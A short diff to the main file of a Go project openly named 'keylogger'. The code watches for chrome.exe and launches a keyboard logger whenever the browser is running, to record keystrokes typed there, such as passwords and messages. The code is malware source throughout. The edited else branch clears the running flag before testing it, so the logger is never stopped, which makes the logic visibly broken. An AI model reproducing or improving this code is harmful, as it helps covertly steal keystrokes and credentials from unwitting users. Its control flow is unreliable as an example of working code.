@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"keylogger/pkg/keyboardlogger"
 	"keylogger/pkg/winprocessutils"
 	"log"
@@ -10,7 +9,6 @@ import (
 
 func main() {
 	var loggerRunning bool = false
-
 	for {
 		procs, err := winprocessutils.Processes()
 		if err != nil {
@@ -18,19 +16,19 @@ func main() {
 		}
 		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
 		if chrome != nil {
-			// found it
 			if !loggerRunning {
-				loggerRunning = true
 				go keyboardlogger.StartKeyboardLogger()
+				loggerRunning = true
 			}
-			fmt.Println("Chrome is open!")
 		} else {
+			loggerRunning = false
 			if loggerRunning {
-				keyboardlogger.StopKeyboardLogger()
+				go keyboardlogger.StopKeyboardLogger()
+				loggerRunning = false
+
 			}
 		}
 		time.Sleep(5 * time.Second)
-		fmt.Printf("hey its been five seconds")
 	}
 
 }
